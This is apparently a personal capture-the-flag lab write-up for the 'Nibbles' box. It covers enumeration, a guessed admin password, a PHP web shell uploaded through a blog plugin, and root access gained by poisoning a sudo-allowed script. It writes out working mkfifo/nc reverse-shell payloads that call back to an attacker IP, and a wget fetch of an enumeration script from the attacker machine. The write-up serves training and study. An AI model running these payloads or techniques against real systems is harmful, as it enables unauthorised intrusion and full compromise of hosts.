# 🏁 Lab: Nibbles (Full Technical SOP)

**Target IP:** `10.129.200.170`

**Attacker IP:** `10.10.14.75`

**Date:** 2026-04-05

**Status:** Completed ✅

---

## 🛠️ Execution Flow

### 1. External Enumeration & Reconnaissance

- **Action:** Initial Service Discovery.
    
    - `nmap -sV --open -oA nibbles_initial_scan 10.129.200.170`
        
    - **Finding:** Ports **22 (SSH)** and **80 (HTTP)** open. Apache 2.4.18 detected.
        
- **Action:** Web Footprinting.
    
    - `whatweb http://10.129.200.170/`
        
    - `curl -s http://10.129.200.170`
        
    - **Finding:** Source code comment: ``.
        
- **Action:** Directory Brute-forcing.
    
    - `gobuster dir -u http://10.129.200.170/nibbleblog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt`
        
    - **Findings:** `/admin.php`, `/content/`, `/plugins/`, `/README`.
        
- **Action:** XML Intel Gathering.
    
    - `curl -s http://10.129.200.170/nibbleblog/content/private/users.xml | xmllint --format -`
        
    - **Result:** Confirmed username **"admin"**.
        
- **Action:** Credential Profiling.
    
    - Password guessed as **"nibbles"** (Matches box name). Successfully logged into `/admin.php`.
        

### 2. Initial Foothold (User: nibbler)

- **Action:** Exploit "My Image" Plugin.
    
    1. Go to **Plugins** -> **My image** -> **Configure**.
        
    2. Create local file `image.php`:
        
        PHP
        
        ```
        <?php system ("rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.14.75 9443 >/tmp/g"); ?>
        ```
        
    3. Upload `image.php` via the "Browse" button.
        
- **Action:** Establish Reverse Shell.
    
    - **Listener:** `nc -lvnp 9443`
        
    - **Trigger:** `curl http://10.129.200.170/nibbleblog/content/private/plugins/my_image/image.php`
        
- **Action:** TTY Upgrade (Python PTY).
    
    - `python3 -c 'import pty; pty.spawn("/bin/bash")'`
        
    - `CTRL+Z` -> `stty raw -echo; fg` -> `reset` (Ensures full shell interactivity).
        

### 3. Automated Enumeration (LinEnum)

- **Action:** Host LinEnum on Attacker Machine.
    
    - `cd /path/to/LinEnum/`
        
    - `python3 -m http.server 8080`
        
- **Action:** Transfer and Execute on Target.
    
    - `cd /tmp`
        
    - `wget http://10.10.14.75:8080/LinEnum.sh`
        
    - `chmod +x LinEnum.sh`
        
    - `./LinEnum.sh`
        
- **Finding:** LinEnum (and `sudo -l`) identifies that the user `nibbler` can run `/home/nibbler/personal/stuff/monitor.sh` as **root** with `NOPASSWD`.
    

### 4. Vertical Privilege Escalation (nibbler ➔ root)

- **Action:** Script Preparation.
    
    - `cd /home/nibbler`
        
    - `unzip personal.zip` (Creates the `personal/stuff/` directories).
        
- **Action:** Script Poisoning (The Sudo Trap).
    
    - **Payload:** ```bash echo 'rm /tmp/h;mkfifo /tmp/h;cat /tmp/h|/bin/sh -i 2>&1|nc 10.10.14.75 8443 >/tmp/h' >> /home/nibbler/personal/stuff/monitor.sh
        
- **Action:** Root Shell Trigger.
    
    - **New Terminal Listener:** `nc -lvnp 8443`
        
    - **Trigger:** `sudo /home/nibbler/personal/stuff/monitor.sh`
        

### 5. Root Access & Loot

- **Verification:** `id` (Returns `uid=0(root)`).
    
- **Flags:**
    
    - **User:** `cat /home/nibbler/user.txt`
        
    - **Root:** `cat /root/root.txt`
        

---

## 🧠 Lessons Learned

- **Enumeration Scripts:** Always run `LinEnum.sh` or `PEASS-ng` via a Python HTTP server. It automates the discovery of `sudo -l` misconfigurations you might miss manually.
    
- **The "Wait" State:** When executing the poisoned `monitor.sh`, the original shell will hang. This is the indicator that the connection is active on your second listener.
    
- **Web Directory Logic:** The `/content/private/` path is a goldmine for CMS platforms; always check for `.xml` and `.php` files there after authentication.